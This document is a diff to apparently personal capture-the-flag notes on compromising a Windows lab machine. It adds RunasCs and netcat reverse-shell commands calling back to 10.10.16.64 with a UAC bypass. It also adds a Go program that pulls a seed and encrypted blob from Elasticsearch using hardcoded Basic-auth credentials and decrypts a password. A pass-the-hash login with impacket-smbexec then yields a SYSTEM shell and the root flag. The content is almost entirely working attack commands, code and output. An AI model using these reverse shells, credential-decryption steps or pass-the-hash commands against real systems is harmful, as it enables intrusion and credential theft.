@@ -383,7 +383,169 @@ Write a programme that will automatically retrieve parameters from elastic and d
 ## Got Nothing works
 
 ```
-.\RunasCs.exe backup ytkCAMAGNEfDiMAvFpdEVGyNzQotkczpxOstRvNT cmd.exe -r 10.10.16.64:4444 --bypass-uac
+.\RunasCs.exe backup NaesVGCIOCQLrCRXmNULHVVEbPmRiIIilHwTIzOd cmd.exe -r 10.10.16.64:1338 --bypass-uac
 
  runascs backup ytkCAMAGNEfDiMAvFpdEVGyNzQotkczpxOstRvNT "cmd.exe /c nc.exe 10.10.16.64 4444 -e cmd.exe" -t 8 --bypass-uac 
+```
+
+## Got the pass Extractor go file
+```
+package main
+
+import (
+        "crypto/aes"
+        "crypto/cipher"
+        "encoding/base64"
+        "fmt"
+        "math/rand"
+        "os/exec"
+        "strconv"
+        "strings"
+)
+
+func getSeed() (int64, string, error) {
+        cmd := exec.Command(
+                "curl",
+                "-i", "-s", "-k", "-X", "GET",
+                "-H", "Host: 10.10.16.64:9200",
+                "-H", "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+                "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                "-H", "Accept-Language: en-US,en;q=0.5",
+                "-H", "Accept-Encoding: gzip, deflate",
+                "-H", "Dnt: 1",
+                "-H", "Authorization: Basic ZWxhc3RpYzpvS0h6alp3MEVHY1J4VDJjdXg1Sw==",
+                "-H", "Upgrade-Insecure-Requests: 1",
+                "-H", "Sec-Fetch-Dest: document",
+                "-H", "Sec-Fetch-Mode: navigate",
+                "-H", "Sec-Fetch-Site: none",
+                "-H", "Sec-Fetch-User: ?1",
+                "-H", "Te: trailers",
+                "-H", "Connection: close",
+                "-b", "i_like_gitea=1bcfba2fb61ea525; lang=en-US",
+                "https://10.10.16.64:9200/_search?q=*&pretty=true",
+        )
+
+        output, err := cmd.CombinedOutput()
+        if err != nil {
+                return 0, "", nil
+        }
+
+        outputLines := strings.Split(string(output), "\n")
+        var seedStr string
+        for _, line := range outputLines {
+                if strings.Contains(line, "seed") && !strings.Contains(line, "index") {
+                        seedStr = strings.TrimSpace(strings.Split(line, ":")[1])
+                        break
+                }
+        }
+
+        seed, err := strconv.ParseInt(seedStr, 10, 64)
+        if err != nil {
+                return 0, "", nil
+        }
+
+        outputLines = strings.Split(string(output), "\n")
+        var blob string
+        for _, line := range outputLines {
+                if strings.Contains(line, "blob") {
+                        blob = line
+                        blob = strings.TrimSpace(strings.Split(line, ":")[1])
+                        blob = strings.Split(blob, "\"")[1]
+                        break
+                }
+        }
+
+        return seed, blob, nil
+}
+
+func generateKey(seed int64) []byte {
+        rand.Seed(seed)
+        key := make([]byte, 16)
+        for i := range key {
+                key[i] = byte(1 + rand.Intn(254))
+        }
+        return key
+}
+
+func decryptCFB(iv, ciphertext, key []byte) ([]byte, error) {
+        block, err := aes.NewCipher(key)
+        if err != nil {
+                return nil, err
+        }
+
+        stream := cipher.NewCFBDecrypter(block, iv)
+        plaintext := make([]byte, len(ciphertext))
+        stream.XORKeyStream(plaintext, ciphertext)
+
+        return plaintext, nil
+}
+
+func main() {
+        seed, encryptedBlob, _ := getSeed()
+
+        key := generateKey(seed)
+
+        decodedBlob, err := base64.URLEncoding.DecodeString(encryptedBlob)
+        if err != nil {
+                fmt.Println("Error decoding base64:", err)
+                return
+        }
+
+        iv := decodedBlob[:aes.BlockSize]
+        encryptedData := decodedBlob[aes.BlockSize:]
+
+        decryptedData, err := decryptCFB(iv, encryptedData, key)
+        if err != nil {
+                fmt.Println("Error decrypting data:", err)
+                return
+        }
+
+        fmt.Printf("Key: %x\n", key)
+        fmt.Printf("IV: %x\n", iv)
+        fmt.Printf("Encrypted Data: %x\n", encryptedData)
+        fmt.Printf("Decrypted Data: %s\n", decryptedData)
+}
+```
+Build it and run it
+```
+
+
+```
+Now i will try these 
+```
+.\RunasCs.exe backup NaesVGCIOCQLrCRXmNULHVVEbPmRiIIilHwTIzOd cmd.exe -r 10.10.16.64:4444 --bypass-uac
+
+ runascs backup NaesVGCIOCQLrCRXmNULHVVEbPmRiIIilHwTIzOd "cmd.exe /c nc.exe 10.10.16.64 4444 -e cmd.exe" -t 8 --bypass-uac 
+
+
+.\RunasCs.exe backup NaesVGCIOCQLrCRXmNULHVVEbPmRiIIilHwTIzOd C:\Temp\reverse.exe --bypass-uac --logon-type '8' 
+```
+
+
+## Not work
+```
+└─# proxychains -q impacket-smbexec -hashes :ED5CC50D93A33729ACD6DF740EECD86C administrator@127.0.0.1
+
+.\RunasCs.exe backup BZdTLUUmVpTbWtRqmUAViexbSwIrowRabVKXFxPO cmd.exe -r 10.10.16.64:4444 --bypass-uac
+
+```
+
+
+## Pivot with admin hash
+```
+└─# impacket-smbexec -hashes :ed5cc50d93a33729acd6df740eecd86c administrator@10.10.16.64
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>
+
+C:\Windows\system32>type C:\users\administrator\desktop\root.txt
+453a7588859f212a17b0af561de66c37
+
+C:\Windows\system32>
+
+
 ```
